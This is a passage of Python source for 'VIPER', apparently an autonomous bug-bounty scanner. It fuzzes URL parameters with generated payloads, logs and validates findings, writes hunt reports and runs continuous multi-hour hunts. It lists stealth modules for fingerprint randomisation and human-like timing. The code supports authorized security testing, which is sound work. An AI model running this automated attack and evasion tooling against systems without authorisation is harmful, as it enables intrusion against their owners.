                        if not grammar:
                            continue
                        gf = GrammarFuzzer(grammar)
                        base_payloads = gf.generate_batch(count=5)

                        async def send_fuzz(payload, _param=param):
                            fuzz_url = f"{target.url.split('?')[0]}?{_param}={urllib.parse.quote(payload)}"
                            status, body, headers = await self.request(fuzz_url)
                            return {"status": status, "body": body[:500], "time": 0, "size": len(body)}

                        fuzz_results = await fuzzer.async_fuzz(send_fuzz, base_payloads, max_iterations=15)
                        for fr in fuzz_results:
                            if fr.interesting:
                                self.log(f"  [FUZZ] Interesting: {fr.payload[:60]} ({fr.reason})")
                                fuzz_finding = {
                                    "type": vuln_type,
                                    "attack": vuln_type,
                                    "vuln_type": vuln_type,
                                    "severity": "medium",
                                    "parameter": param,
                                    "payload": fr.payload,
                                    "reason": fr.reason,
                                    "url": f"{target.url.split('?')[0]}?{param}={urllib.parse.quote(fr.payload)}",
                                    "source": "fuzzer",
                                    "details": f"Fuzzer found interesting {vuln_type} behavior on param '{param}': {fr.reason}"
                                }
                                # Validate fuzzer finding
                                if self.validator:
                                    try:
                                        valid, confidence, reason = await self.validator.validate(fuzz_finding, target_url)
                                        fuzz_finding["validated"] = valid
                                        fuzz_finding["confidence"] = confidence
                                        fuzz_finding["validation_reason"] = reason
                                        if valid:
                                            fuzz_finding["severity"] = "high"
                                            self.log(f"  [FUZZ] Validated: {fr.payload[:40]} (confidence={confidence:.2f})")
                                    except Exception:
                                        fuzz_finding["validated"] = False
                                        fuzz_finding["confidence"] = 0.3
                                else:
                                    fuzz_finding["validated"] = False
                                    fuzz_finding["confidence"] = 0.3
                                # VIPER 4.0: MITRE CWE/CAPEC enrichment
                                if hasattr(self, 'mitre_enricher') and self.mitre_enricher:
                                    try:
                                        fuzz_finding = self.mitre_enricher.enrich(fuzz_finding)
                                    except Exception:
                                        pass
                                findings.append(fuzz_finding)
                                target.vulns_found.append(fuzz_finding)
                                self.metrics["total_findings"] += 1
                                _emit("finding", vuln_type=vuln_type,
                                      severity=fuzz_finding.get("severity", "medium"),
                                      url=fuzz_finding.get("url", target_url),
                                      confidence=fuzz_finding.get("confidence", 0.3),
                                      source="fuzzer",
                                      validated=fuzz_finding.get("validated", False))
                                # Persist to DB
                                if self.db:
                                    try:
                                        domain = urllib.parse.urlparse(target_url).netloc
                                        tid = self.db.add_target(target_url, domain)
                                        self.db.add_finding(
                                            target_id=tid, vuln_type=vuln_type,
                                            severity=fuzz_finding["severity"],
                                            title=f"Fuzzer: {vuln_type} on {param}",
                                            url=fuzz_finding["url"],
                                            payload=fr.payload,
                                            evidence=fr.reason,
                                            confidence=fuzz_finding.get("confidence", 0.3),
                                            validated=fuzz_finding.get("validated", False),
                                        )
                                    except Exception:
                                        pass
            except Exception as e:
                self.log(f"  [FUZZ] Error: {e}", "WARN")

        elapsed = (datetime.now() - start_time).total_seconds()

        # EvoGraph: end session and save Q-table
        if self.evograph and self._evograph_session_id:
            try:
                total_reward = sum(
                    10.0 if f.get("validated", False) else 5.0
                    for f in findings
                ) if findings else -float(len(tried_attacks))
                self.evograph.end_session(
                    self._evograph_session_id, len(findings), total_reward
                )
                if self._brain:
                    self.evograph.save_q_table(
                        self._evograph_session_id, self._brain.q_table
                    )
            except Exception as e:
                self.log(f"[EvoGraph] end_session failed: {e}", "WARN")
            self._evograph_session_id = None

        # VIPER 3.0: Save attack graph to DB
        if enable_graph and self.attack_graph and len(self.attack_graph) > 0:
            try:
                graph_db = str(DATA_DIR / "attack_graph.db")
                self.attack_graph.save_to_db(graph_db)
                self.log(f"[AttackGraph] Saved {len(self.attack_graph)} nodes to {graph_db}", "INFO")
            except Exception as e:
                self.log(f"[AttackGraph] Save failed: {e}", "WARN")

        # VIPER 3.0: Post-exploit phase
        if enable_post_exploit and self.post_exploit and findings:
            try:
                self.log("[PostExploit] Running post-exploitation analysis...", "INFO")
                _emit("phase", phase="post_exploit", target=target_url)
                if self.phase_engine:
                    try:
                        self.phase_engine.transition(Phase.POST_EXPLOIT if hasattr(Phase, 'POST_EXPLOIT') else 'post_exploit')
                    except Exception:
                        pass
            except Exception as e:
                self.log(f"[PostExploit] Error: {e}", "WARN")

        # VIPER 3.0: Code remediation (post-hunt option)
        if enable_codefix and self.codefix_agent and findings:
            try:
                self.log("[CodeFix] Generating remediation suggestions...", "INFO")
            except Exception as e:
                self.log(f"[CodeFix] Error: {e}", "WARN")

        result = {
            "success": len(findings) > 0,
            "findings": findings,
            "access_level": target.access_level,
            "attacks_tried": len(tried_attacks),
            "elapsed_seconds": elapsed,
        }

        _emit("hunt_end", target=target_url,
              findings=len(findings), attacks_tried=len(tried_attacks),
              elapsed=elapsed, access_level=target.access_level)

        # VIPER 3.0: Include attack graph data
        if enable_graph and self.attack_graph:
            try:
                result["attack_graph"] = self.attack_graph.to_dict()
            except Exception:
                pass

        return result
    
    def _generate_full_report(self, target: Target, results: Dict, elapsed: float) -> Path:
        """Generate comprehensive hunt report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        domain = urllib.parse.urlparse(target.url).netloc.replace(":", "_")
        report_file = REPORTS_DIR / f"viper_full_{domain}_{timestamp}.md"
        
        findings = results.get("findings", [])
        nuclei = results.get("nuclei_findings", [])
        
        report = f"""# VIPER Full Hunt Report

## Target: {target.url}
## Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
## Duration: {elapsed:.1f} seconds

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Manual Findings | {len(findings)} |
| Nuclei Findings | {len(nuclei)} |
| Access Level | {target.access_level} |
| Subdomains Found | {len(target.subdomains)} |
| Technologies | {', '.join(target.technologies) or 'Unknown'} |
| Parameters | {len(target.parameters)} |
| API Endpoints | {len(target.api_endpoints)} |

---

## Critical Findings

"""
        
        # Critical findings first
        critical = [f for f in findings + nuclei if f.get('severity', '').lower() in ['critical', 'high']]
        if critical:
            for i, f in enumerate(critical, 1):
                report += f"""
### {i}. {f.get('attack', f.get('template_name', 'Unknown'))} [{f.get('severity', 'N/A').upper()}]

- **URL:** {f.get('url', f.get('matched_at', 'N/A'))}
- **Payload:** `{f.get('payload', 'N/A')}`
- **Evidence:** {f.get('marker', f.get('matcher_name', 'N/A'))}

"""
        else:
            report += "*No critical vulnerabilities found*\n"
        
        # All findings
        report += """
---

## All Findings

"""
        
        for i, f in enumerate(findings, 1):
            report += f"- [{f.get('severity', 'N/A').upper()}] {f.get('attack', 'Unknown')} @ {f.get('url', 'N/A')}\n"
        
        for i, f in enumerate(nuclei, 1):
            report += f"- [NUCLEI] [{f.get('severity', 'N/A').upper()}] {f.get('template_name', 'Unknown')}\n"
        
        # Recon results
        if "recon" in results.get("phases", {}):
            recon = results["phases"]["recon"]
            report += f"""
---

## Reconnaissance Results

### Subdomains ({len(recon.get('subdomains', []))})
"""
            for sub in list(recon.get('subdomains', []))[:20]:
                report += f"- {sub}\n"
            
            if len(recon.get('subdomains', [])) > 20:
                report += f"- ... and {len(recon['subdomains']) - 20} more\n"
        
        # Surface mapping
        if "surface" in results.get("phases", {}):
            surface = results["phases"]["surface"]
            report += f"""
---

## Attack Surface

### Parameters Found
"""
            for url, params in list(surface.get('url_parameters', {}).items())[:10]:
                report += f"- `{url}`: {params}\n"
            
            if surface.get('js_secrets'):
                report += "\n### Potential Secrets in JS\n"
                for secret in surface.get('js_secrets', [])[:5]:
                    report += f"- Source: {secret.get('source')}\n"
        
        # Compliance mapping section
        if COMPLIANCE_AVAILABLE and findings:
            report += "\n---\n\n"
            report += format_compliance_section(findings)

        report += """
---

*Generated by VIPER Core v2 - Autonomous Bug Bounty Hunter*
"""

        report_file.write_text(report, encoding='utf-8')
        return report_file
    
    async def continuous_hunt(self, targets: List[str], hours: float = 24):
        """Run continuously for specified hours."""
        self.metrics["start_time"] = datetime.now().isoformat()
        self.metrics["sessions_run"] += 1
        
        end_time = datetime.now() + timedelta(hours=hours)
        
        self.log(f"=== VIPER Continuous Mode ===")
        self.log(f"Targets: {len(targets)}")
        self.log(f"Duration: {hours} hours")
        
        cycle = 0
        exhaustion_counter = {}  # target -> consecutive zero-finding cycles
        MAX_ZERO_CYCLES = 3
        async with aiohttp.ClientSession() as self.session:
            while datetime.now() < end_time:
                cycle += 1
                self.log(f"\n--- Cycle {cycle} ---")

                for target in targets:
                    if datetime.now() >= end_time:
                        break

                    # Skip exhausted targets
                    if exhaustion_counter.get(target, 0) >= MAX_ZERO_CYCLES:
                        self.log(f"[EXHAUSTION] Skipping {target} — {MAX_ZERO_CYCLES} consecutive cycles with 0 findings")
                        continue

                    try:
                        result = await self.full_hunt(target, max_minutes=15)

                        new_findings = result.get("findings", [])
                        if new_findings:
                            self.log(f"[+] {len(new_findings)} findings!", "SUCCESS")
                            exhaustion_counter[target] = 0
                        else:
                            exhaustion_counter[target] = exhaustion_counter.get(target, 0) + 1
                            self.log(f"[EXHAUSTION] {target}: {exhaustion_counter[target]}/{MAX_ZERO_CYCLES} zero-finding cycles")
                    except Exception as e:
                        self.log(f"Error hunting {target}: {e}", "ERROR")

                    await asyncio.sleep(2)

                # Check if all targets are exhausted
                if all(exhaustion_counter.get(t, 0) >= MAX_ZERO_CYCLES for t in targets):
                    self.log("[EXHAUSTION] All targets exhausted — stopping continuous hunt")
                    break

                self.save_state()

                if datetime.now() < end_time:
                    self.log("Cycle complete, waiting 5 minutes...")
                    await asyncio.sleep(300)
        
        elapsed = (datetime.now() - datetime.fromisoformat(self.metrics["start_time"])).total_seconds()
        self.metrics["uptime_seconds"] += elapsed
        
        self.log(f"\n=== Session Complete ===")
        self.log(f"Total requests: {self.metrics['total_requests']}")
        self.log(f"Total findings: {self.metrics['total_findings']}")
        
        self.save_state()


async def main():
    import sys
    
    viper = ViperCore()
    
    if len(sys.argv) < 2:
        print("VIPER Core v5.0 - Autonomous Bug Bounty Hunter")
        print()
        print("Usage:")
        print("  python viper_core.py <url>                # Quick hunt (5 min manual)")
        print("  python viper_core.py <url> --full         # Full hunt (recon + nuclei + attacks)")
        print("  python viper_core.py <url> --full 30      # Full hunt with 30 min limit")
        print("  python viper_core.py <url> --agents       # Multi-agent parallel hunt")
        print("  python viper_core.py --continuous <url>    # Continuous hunting")
        print("  python viper_core.py --stats              # Show statistics")
        print("  python viper_core.py --modules            # Check available modules")
        return
    
    if sys.argv[1] == "--stats":
        print(json.dumps(viper.metrics, indent=2, default=str))
        print("\nAttack success rates:")
        for name, attack in sorted(viper.knowledge.attacks.items(), 
                                    key=lambda x: x[1].success_rate, reverse=True):
            if attack.attempts > 0:
                print(f"  {name}: {attack.success_rate:.1%} ({attack.successes}/{attack.attempts})")
        return
    
    if sys.argv[1] == "--modules":
        print("VIPER 5.0 Module Status:")
        print()
        print("  Core (v3-v4):")
        print(f"    Recon Engine:     {'[OK]' if viper.recon_engine else '[MISSING]'}")
        print(f"    Surface Mapper:   {'[OK]' if viper.surface_mapper else '[MISSING]'}")
        print(f"    Nuclei Scanner:   {'[OK]' if viper.nuclei_scanner else '[MISSING]'}")
        print(f"    LLM Analyzer:     {'[OK]' if viper.llm_analyzer else '[MISSING]'}")
        print(f"    Scope Manager:    {'[OK]' if viper.scope_manager else '[MISSING]'}")
        print(f"    EvoGraph:         {'[OK]' if EVOGRAPH_AVAILABLE else '[MISSING]'}")
        print(f"    Stealth Engine:   {'[OK]' if STEALTH_AVAILABLE else '[MISSING]'}")
        print(f"    Guardrails:       {'[OK]' if GUARDRAILS_AVAILABLE else '[MISSING]'}")
        print(f"    Orchestrator:     {'[OK]' if viper.orchestrator else '[MISSING]'}")
        print()
        print("  v5 Multi-Agent:")
        print(f"    Agent Bus:        {'[OK]' if AGENT_BUS_AVAILABLE else '[MISSING]'}")
        print(f"    Agent Registry:   {'[OK]' if AGENT_BUS_AVAILABLE else '[MISSING]'}")
        print(f"    Agents Enabled:   {'[OK]' if viper.orchestrator and viper.orchestrator._enable_agents else '[OFF]'}")
        print()
        print("  v5 Attack Modules:")
        print(f"    OAuth Fuzzer:     {'[OK]' if OAUTH_FUZZER_AVAILABLE else '[MISSING]'}")
        print(f"    WebSocket Fuzzer: {'[OK]' if WS_FUZZER_AVAILABLE else '[MISSING]'}")
        print(f"    Race Engine:      {'[OK]' if RACE_ENGINE_AVAILABLE else '[MISSING]'}")
        print(f"    Logic Modeler:    {'[OK]' if LOGIC_MODELER_AVAILABLE else '[MISSING]'}")
        print(f"    Genetic Fuzzer:   {'[OK]' if GENETIC_FUZZER_AVAILABLE else '[MISSING]'}")
        print()
        print("  v5 Self-Learning:")
        print(f"    Failure Analyzer: {'[OK]' if viper.failure_analyzer else '[MISSING]'}")
        print(f"    Cross Correlator: {'[OK]' if viper.cross_correlator else '[MISSING]'}")
        print()
        print("  v5 Stealth & OPSEC:")
        print(f"    FP Randomizer:    {'[OK]' if viper.fingerprint_randomizer else '[MISSING]'}")
        print(f"    Human Timing:     {'[OK]' if viper.human_timing else '[MISSING]'}")
        print(f"    Chain of Custody: {'[OK]' if viper.chain_of_custody else '[MISSING]'}")
        print()
        print("  v5 Reporting:")
        print(f"    CVSS v4.0:        {'[OK]' if CVSS4_AVAILABLE else '[MISSING]'}")
        print(f"    Finding Stream:   {'[OK]' if viper.finding_stream else '[MISSING]'}")
        return
    
    if sys.argv[1] == "--continuous":
        # FIXED 2026-03-24: Removed local VirtualBox IP (192.168.56.1:8080)
        # --continuous now requires an explicit target arg: python viper_core.py --continuous <url> [hours]
        if len(sys.argv) < 3:
            print("ERROR: --continuous requires a target URL. Usage: python viper_core.py --continuous <url> [hours]")
            print("Do NOT use local IPs. Use real HackerOne/Intigriti in-scope targets only.")
            return
        targets = [sys.argv[2]]
        hours = float(sys.argv[3]) if len(sys.argv) > 3 else 24
        await viper.continuous_hunt(targets, hours=hours)
        return
    
    target = sys.argv[1]
    
    if "--full" in sys.argv:
        # Full hunt mode
        try:
            minutes_idx = sys.argv.index("--full") + 1
            minutes = int(sys.argv[minutes_idx]) if minutes_idx < len(sys.argv) else 30
        except (ValueError, IndexError):
            minutes = 30
        
        async with aiohttp.ClientSession() as viper.session:
            result = await viper.full_hunt(target, max_minutes=minutes)
        
        print(f"\n=== Results ===")
        print(f"Findings: {len(result.get('findings', []))}")
        print(f"Nuclei: {len(result.get('nuclei_findings', []))}")
        print(f"Report: {result.get('report_file')}")
    else:
        # Quick manual hunt
        minutes = int(sys.argv[2]) if len(sys.argv) > 2 else 5
        
        async with aiohttp.ClientSession() as viper.session:
            result = await viper.hunt(target, max_minutes=minutes)
        
        if result.get("findings"):
            print(f"\n[+] SUCCESS: {len(result['findings'])} vulnerabilities found!")
        else:
            print(f"\n[-] No vulnerabilities found in {minutes} minutes")


if __name__ == "__main__":
    asyncio.run(main())
